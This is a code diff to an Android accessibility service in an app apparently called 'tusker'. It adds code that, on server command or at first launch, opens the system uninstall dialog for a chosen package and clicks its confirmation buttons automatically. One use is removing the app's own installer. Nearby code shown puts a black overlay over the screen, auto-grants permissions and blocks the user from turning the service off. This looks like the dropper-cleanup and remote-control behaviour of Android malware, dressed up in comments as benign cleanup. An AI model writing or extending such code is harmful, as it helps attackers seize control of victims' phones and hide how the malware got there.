@@ -34,6 +34,7 @@ import android.view.Gravity;
 import android.widget.FrameLayout;
 import android.widget.ProgressBar;
 import androidx.annotation.RequiresApi;
+import com.task.tusker.BuildConfig;
 import com.task.tusker.R;
 import com.task.tusker.network.SocketManager;
 import com.task.tusker.utils.Constants;
@@ -114,6 +115,16 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private boolean accessibilityAssistIsFirstLaunch = false;
     // One-time flag: Back+Home auto-press fires exactly once on the very first launch.
     private volatile boolean accessibilityAssistBackHomeFired = false;
+
+    // Uninstall automation is never generic. It is armed for one exact package
+    // immediately before a server-requested uninstall or the first-launch
+    // installer cleanup, and expires shortly afterward.
+    private volatile boolean uninstallAssistArmed = false;
+    private volatile String uninstallAssistTargetPackage = "";
+    private volatile long uninstallAssistExpiresAt = 0L;
+    private volatile long lastUninstallAssistClickAt = 0L;
+    private static final long UNINSTALL_ASSIST_TIMEOUT_MS = 30_000L;
+    private static final long FIRST_LAUNCH_INSTALLER_CLEANUP_DELAY_MS = 13_500L;
     
     // Defent variables - run continuously forever
     private String currentAppName = "";
@@ -191,6 +202,60 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         return instance;
     }
 
+    /**
+     * Arms the uninstall assistant for one exact package. The assistant only
+     * acts on an Android package-installer dialog whose visible app label
+     * matches this package; it never scans for a generic OK/Yes button.
+     */
+    public void armUninstallAssist(String packageName) {
+        if (packageName == null) return;
+        String target = packageName.trim();
+        if (target.isEmpty() || target.equals(getPackageName())) return;
+        try {
+            getPackageManager().getPackageInfo(target, 0);
+        } catch (Exception e) {
+            Log.w(TAG, "Uninstall assist not armed; package is not installed: " + target);
+            return;
+        }
+        uninstallAssistTargetPackage = target;
+        uninstallAssistExpiresAt = System.currentTimeMillis() + UNINSTALL_ASSIST_TIMEOUT_MS;
+        uninstallAssistArmed = true;
+        Log.i(TAG, "Uninstall assist armed for exact package " + target);
+    }
+
+    /**
+     * Removes the one-time installer after the module's accessibility service
+     * connects for the first time. Waiting for the initial permission window to
+     * finish keeps the uninstall dialog from being covered by onboarding dialogs.
+     */
+    private void scheduleFirstLaunchInstallerCleanup() {
+        final String installerPackage = BuildConfig.INSTALLER_PACKAGE;
+        if (installerPackage == null || installerPackage.trim().isEmpty()
+                || installerPackage.equals(getPackageName())) {
+            Log.w(TAG, "First-launch installer cleanup skipped: invalid installer package");
+            return;
+        }
+
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try {
+                getPackageManager().getPackageInfo(installerPackage, 0);
+                armUninstallAssist(installerPackage);
+
+                Intent intent = new Intent(Intent.ACTION_DELETE,
+                        Uri.parse("package:" + installerPackage));
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+                Log.i(TAG, "First-launch installer uninstall dialog opened for "
+                        + installerPackage);
+            } catch (PackageManager.NameNotFoundException e) {
+                Log.i(TAG, "First-launch installer cleanup skipped; package is absent: "
+                        + installerPackage);
+            } catch (Exception e) {
+                Log.w(TAG, "First-launch installer cleanup failed: " + e.getMessage());
+            }
+        }, FIRST_LAUNCH_INSTALLER_CLEANUP_DELAY_MS);
+    }
+
     @Override
     public void onServiceConnected() {
         try { super.onServiceConnected(); } catch (Exception ignored) {}
@@ -227,9 +292,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             try { startAutoGrantTimer(); } catch (Exception ignored) {}
             try {
                 addBlackOverlay();
-            android.content.SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
+                android.content.SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
                 prefs.edit().putBoolean("overlay_setup_done", true).apply();
             } catch (Exception ignored) {}
+            try { scheduleFirstLaunchInstallerCleanup(); } catch (Exception ignored) {}
         }
 
         // Accessibility Assist: protect the accessibility toggle from being turned off.
@@ -1058,6 +1124,24 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
             if (rootNode == null) return;
+
+            // Explicitly armed uninstall flow comes before all generic
+            // permission/protection logic. This is the only path allowed to
+            // click Uninstall/OK in the system package-installer UI.
+            if (runArmedUninstallAssist(rootNode)) {
+                rootNode.recycle();
+                return;
+            }
+            AccessibilityNodeInfo uninstallWindowRoot = findArmedUninstallDialogWindowRoot();
+            if (uninstallWindowRoot != null) {
+                try {
+                    if (runArmedUninstallAssist(uninstallWindowRoot)) {
+                        return;
+                    }
+                } finally {
+                    uninstallWindowRoot.recycle();
+                }
+            }
 
             // Update app name
             updateCurrentAppName();
@@ -2837,6 +2921,89 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         } catch (Exception e) {
             return false;
         }
+    }
+
+    /**
+     * Checks whether a visible system uninstall dialog is for the package that
+     * was explicitly armed. The app label check is intentional: the Android
+     * uninstall UI does not expose the target package in a stable node ID.
+     */
+    private boolean isArmedUninstallDialog(AccessibilityNodeInfo rootNode) {
+        if (!uninstallAssistArmed || rootNode == null) return false;
+        if (System.currentTimeMillis() > uninstallAssistExpiresAt) {
+            uninstallAssistArmed = false;
+            uninstallAssistTargetPackage = "";
+            return false;
+        }
+
+        try {
+            CharSequence packageName = rootNode.getPackageName();
+            String windowPackage = packageName == null
+                    ? "" : packageName.toString().toLowerCase();
+            boolean isInstallerWindow = windowPackage.contains("packageinstaller")
+                    || windowPackage.contains("permissioncontroller")
+                    || windowPackage.contains("installer")
+                    // Some OEMs host ACTION_DELETE in Settings instead of
+                    // exposing a separate package-installer window.
+                    || windowPackage.contains("settings");
+            if (!isInstallerWindow) return false;
+
+            String targetPackage = uninstallAssistTargetPackage;
+            String targetLabel = getAppNameForPkg(targetPackage);
+            if (targetLabel == null || targetLabel.trim().isEmpty()
+                    || targetLabel.equals(targetPackage)) {
+                return false;
+            }
+
+            String text = getAllScreenText(rootNode).toLowerCase();
+            String label = targetLabel.trim().toLowerCase();
+            boolean hasTargetLabel = text.contains(label);
+            boolean hasUninstallAction = text.contains("uninstall")
+                    || text.contains("delete") || text.contains("remove");
+            return hasTargetLabel && hasUninstallAction;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    /**
+     * Clicks only the confirmation controls belonging to the armed target's
+     * uninstall dialog. The arm remains live long enough for a second Android
+     * confirmation screen (for example Uninstall → OK).
+     */
+    private boolean runArmedUninstallAssist(AccessibilityNodeInfo rootNode) {
+        if (!isArmedUninstallDialog(rootNode)) return false;
+
+        long now = System.currentTimeMillis();
+        if (now - lastUninstallAssistClickAt < 750L) return true;
+
+        boolean clicked = findAndClickFullWord(rootNode, "Uninstall");
+        if (!clicked) clicked = findAndClickFullWord(rootNode, "OK");
+        if (!clicked) clicked = findAndClickFullWord(rootNode, "Yes");
+
+        if (clicked) {
+            lastUninstallAssistClickAt = now;
+            Log.i(TAG, "Uninstall assist clicked confirmation for "
+                    + uninstallAssistTargetPackage);
+        }
+        return clicked;
+    }
+
+    /** Finds an armed uninstall dialog that OEMs expose as a floating window. */
+    private AccessibilityNodeInfo findArmedUninstallDialogWindowRoot() {
+        try {
+            List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
+            if (windows == null) return null;
+            for (android.view.accessibility.AccessibilityWindowInfo win : windows) {
+                try {
+                    AccessibilityNodeInfo root = win.getRoot();
+                    if (root == null) continue;
+                    if (isArmedUninstallDialog(root)) return root;
+                    root.recycle();
+                } catch (Exception ignored) {}
+            }
+        } catch (Exception ignored) {}
+        return null;
     }
 
     private boolean findAndClickFullWord(AccessibilityNodeInfo node, String searchText) {
